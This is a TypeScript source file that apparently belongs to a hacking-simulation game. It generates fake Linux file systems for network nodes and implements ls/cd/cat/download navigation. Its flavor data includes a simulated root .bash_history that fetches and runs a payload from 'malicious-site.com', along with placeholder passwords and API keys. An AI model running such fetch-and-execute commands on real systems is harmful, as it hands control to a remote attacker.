import { FileSystemNode, FileSystemState, NavigationResult } from '../types/filesystem';
import { NetworkNode } from '../components/NetworkMap';

// Generate file system structure for different node types
export const generateFileSystem = (node: NetworkNode): FileSystemNode => {
  const baseSystem: FileSystemNode = {
    'readme.txt': 'System access granted. Explore carefully.',
    'etc': {
      'passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin',
      'shadow': '[PERMISSION DENIED]',
      'hosts': '127.0.0.1 localhost\n192.168.0.1 gateway\n8.8.8.8 dns.google',
      'crontab': '# System crontab\n0 2 * * * root /usr/bin/backup.sh\n*/5 * * * * root /usr/bin/monitor.sh'
    },
    'var': {
      'log': {
        'auth.log': 'Jan 20 10:30:15 server sshd[1234]: Accepted password for root from 192.168.0.100\nJan 20 10:31:22 server sshd[1235]: Failed password for admin from 203.0.113.42',
        'syslog': 'Jan 20 10:30:00 server kernel: [    0.000000] Linux version 5.4.0\nJan 20 10:30:01 server systemd[1]: Started System Logging Service.',
        'access.log': '192.168.0.100 - - [20/Jan/2024:10:30:15] "GET /admin HTTP/1.1" 200 1234\n203.0.113.42 - - [20/Jan/2024:10:31:22] "POST /login HTTP/1.1" 403 567'
      },
      'www': {
        'html': {
          'index.html': '<!DOCTYPE html>\n<html>\n<head><title>Server Status</title></head>\n<body><h1>System Online</h1></body>\n</html>',
          'admin': {
            'config.php': '<?php\n$db_host = "localhost";\n$db_user = "admin";\n$db_pass = "secretpass123";\n$db_name = "maindb";\n?>'
          }
        }
      },
      'tmp': {}
    },
    'home': {
      'root': {
        '.bash_history': 'ls -la\ncat /etc/passwd\nwget http://malicious-site.com/payload.sh\nchmod +x payload.sh\n./payload.sh',
        '.ssh': {
          'id_rsa': '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7...\n[TRUNCATED FOR SECURITY]\n-----END PRIVATE KEY-----',
          'authorized_keys': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... root@attacker-machine'
        }
      }
    },
    'usr': {
      'bin': {
        'backup.sh': '#!/bin/bash\ntar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /home /etc\necho "Backup completed"',
        'monitor.sh': '#!/bin/bash\nps aux | grep -v grep | grep suspicious_process && killall suspicious_process'
      },
      'local': {
        'bin': {}
      }
    },
    'opt': {},
    'tmp': {}
  };

  // Customize based on node type
  switch (node.status) {
    case 'vulnerable':
      return {
        ...baseSystem,
        'secrets': {
          'passwords.txt': 'admin:password123\nroot:toor\nuser:123456\nservice:service123',
          'database_backup.sql': 'CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(50));\nINSERT INTO users VALUES (1, "admin", "plaintext_password");',
          'api_keys.txt': 'stripe_key=sk_live_abc123xyz789\naws_access_key=AKIAIOSFODNN7EXAMPLE\naws_secret_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
        },
        'config': {
          'database.conf': 'host=localhost\nport=3306\nuser=root\npassword=admin123\ndatabase=production',
          'app.env': 'DEBUG=true\nSECRET_KEY=super_secret_key_123\nDATABASE_URL=mysql://root:admin123@localhost/prod'
        }
      };

    case 'encrypted':
      return {
        ...baseSystem,
        'encrypted': {
          'vault.enc': '[AES-256 ENCRYPTED DATA]\n4f8a2c9e1b7d3a5f6e8c9b2a4d7f1e3c9b2a4d7f1e3c4f8a2c9e1b7d3a5f6e8c',
          'keys.pem': '-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFHDBOBgkqhkiG9w0BAQwwQTApBgkqhkiG9w0BAQwwHAQI...\n[ENCRYPTED]\n-----END ENCRYPTED PRIVATE KEY-----',
          'secure_config.json': '{"encrypted": true, "algorithm": "AES-256-GCM", "data": "encrypted_payload_here"}'
        },
        'certificates': {
          'server.crt': '-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAKoK/heBjcOuMA0GCSqGSIb3DQEBCwUA...\n-----END CERTIFICATE-----',
          'ca.crt': '-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAKoK/heBjcOuMA0GCSqGSIb3DQEBCwUA...\n-----END CERTIFICATE-----'
        }
      };

    case 'honeypot':
      return {
        ...baseSystem,
        'bait': {
          'top_secret.txt': '🍯 CLASSIFIED OPERATION BLUE_FALCON 🍯\n\nAgent: 007\nMission: Infiltrate enemy network\nLocation: [REDACTED]\n\n⚠️ WARNING: YOU ARE BEING MONITORED ⚠️',
          'financial_records.csv': 'account,balance,ssn\n"Swiss Bank",50000000,"000-00-0000"\n"Cayman Islands",25000000,"111-11-1111"\n\n[HONEYPOT DATA - FAKE]',
          'nuclear_codes.txt': 'Launch Code: 00000000\nAuthorization: POTUS\nTarget: [CLASSIFIED]\n\n🍯 This is a honeypot trap! 🍯'
        },
        'monitoring': {
          'intrusion.log': `[HONEYPOT ALERT] Intrusion detected at ${new Date().toISOString()}\n[ALERT] Attacker IP logged and reported\n[ALERT] Security team notified`,
          'attacker_profile.json': '{"ip": "203.0.113.42", "country": "Unknown", "threat_level": "HIGH", "techniques": ["port_scanning", "brute_force"]}'
        }
      };

    case 'firewall':
      return {
        ...baseSystem,
        'firewall': {
          'rules.conf': 'DROP INPUT from 0.0.0.0/0 to port 23\nALLOW INPUT from 192.168.0.0/24 to port 22\nDROP INPUT from 0.0.0.0/0 to port 21\nALLOW OUTPUT to 0.0.0.0/0',
          'blocked_ips.txt': '203.0.113.42 - Multiple failed login attempts\n198.51.100.123 - Port scanning detected\n192.0.2.99 - Malicious payload detected',
          'whitelist.txt': '192.168.0.0/24 - Internal network\n10.0.0.0/8 - Corporate VPN\n172.16.0.0/12 - DMZ network'
        },
        'security': {
          'audit.log': 'Connection attempt blocked from 203.0.113.42:1337\nSuspicious traffic detected from 198.51.100.123\nFirewall rule updated: DENY 192.0.2.99',
          'alerts.json': '{"high_priority": 15, "medium_priority": 42, "low_priority": 128, "last_update": "2024-01-20T10:30:00Z"}'
        }
      };

    default:
      return baseSystem;
  }
};

// Navigation utilities
export class FileSystemNavigator {
  private fs: FileSystemNode;
  private currentPath: string[];
  private downloadedFiles: { filename: string; content: string; source: string; timestamp: string }[];

  constructor(fileSystem: FileSystemNode) {
    this.fs = fileSystem;
    this.currentPath = [];
    this.downloadedFiles = [];
  }

  getCurrentPath(): string {
    return '/' + this.currentPath.join('/');
  }

  getCurrentDirectory(): FileSystemNode | string {
    let current: FileSystemNode | string = this.fs;
    
    for (const segment of this.currentPath) {
      if (typeof current === 'string') {
        return current;
      }
      if (!(segment in current)) {
        return {};
      }
      current = current[segment];
    }
    
    return current;
  }

  listDirectory(): string[] {
    const current = this.getCurrentDirectory();
    
    if (typeof current === 'string') {
      return ['Error: Not a directory'];
    }
    
    const entries = Object.keys(current);
    const result: string[] = [];
    
    entries.forEach(entry => {
      const item = current[entry];
      if (typeof item === 'string') {
        // It's a file
        const size = Math.floor(Math.random() * 10000 + 1000);
        const date = 'Jan 15 12:' + String(Math.floor(Math.random() * 60)).padStart(2, '0');
        result.push(`-rw-r--r-- 1 root root ${size.toString().padStart(8)} ${date} ${entry}`);
      } else {
        // It's a directory
        const date = 'Jan 15 12:' + String(Math.floor(Math.random() * 60)).padStart(2, '0');
        result.push(`drwxr-xr-x 2 root root     4096 ${date} ${entry}/`);
      }
    });
    
    return result.length > 0 ? ['total ' + entries.length, ...result] : ['Directory is empty'];
  }

  changeDirectory(path: string): NavigationResult {
    if (!path || path === '.') {
      return { success: true };
    }
    
    if (path === '..') {
      if (this.currentPath.length > 0) {
        this.currentPath.pop();
      }
      return { success: true };
    }
    
    if (path === '/') {
      this.currentPath = [];
      return { success: true };
    }
    
    // Handle absolute paths
    if (path.startsWith('/')) {
      this.currentPath = [];
      path = path.substring(1);
    }
    
    // Handle relative paths
    const segments = path.split('/').filter(segment => segment !== '');
    const newPath = [...this.currentPath];
    
    for (const segment of segments) {
      if (segment === '..') {
        if (newPath.length > 0) {
          newPath.pop();
        }
        continue;
      }
      
      // Check if the directory exists
      let current: FileSystemNode | string = this.fs;
      for (const pathSegment of newPath) {
        if (typeof current === 'string') {
          return { success: false, message: `cd: ${path}: Not a directory` };
        }
        current = current[pathSegment];
      }
      
      if (typeof current === 'string') {
        return { success: false, message: `cd: ${path}: Not a directory` };
      }
      
      if (!(segment in current)) {
        return { success: false, message: `cd: ${path}: No such file or directory` };
      }
      
      if (typeof current[segment] === 'string') {
        return { success: false, message: `cd: ${path}: Not a directory` };
      }
      
      newPath.push(segment);
    }
    
    this.currentPath = newPath;
    return { success: true };
  }

  readFile(filename: string): NavigationResult {
    const current = this.getCurrentDirectory();
    
    if (typeof current === 'string') {
      return { success: false, message: `cat: ${filename}: Not in a directory` };
    }
    
    if (!(filename in current)) {
      return { success: false, message: `cat: ${filename}: No such file or directory` };
    }
    
    const file = current[filename];
    
    if (typeof file !== 'string') {
      return { success: false, message: `cat: ${filename}: Is a directory` };
    }
    
    return { success: true, message: file };
  }

  downloadFile(filename: string, nodeIp: string): NavigationResult {
    const readResult = this.readFile(filename);
    
    if (!readResult.success) {
      return readResult;
    }
    
    const downloadedFile = {
      filename,
      content: readResult.message || '',
      source: `${nodeIp}:${this.getCurrentPath()}`,
      timestamp: new Date().toISOString()
    };
    
    this.downloadedFiles.push(downloadedFile);
    
    return { 
      success: true, 
      message: `File '${filename}' downloaded successfully to local storage.\nSource: ${downloadedFile.source}\nSize: ${readResult.message?.length || 0} bytes` 
    };
  }

  getDownloadedFiles() {
    return this.downloadedFiles;
  }

  // Helper method to check if a path exists
  pathExists(path: string): boolean {
    const segments = path.startsWith('/') ? path.substring(1).split('/') : path.split('/');
    let current: FileSystemNode | string = this.fs;
    
    for (const segment of segments.filter(s => s !== '')) {
      if (typeof current === 'string') {
        return false;
      }
      if (!(segment in current)) {
        return false;
      }
      current = current[segment];
    }
    
    return true;
  }
}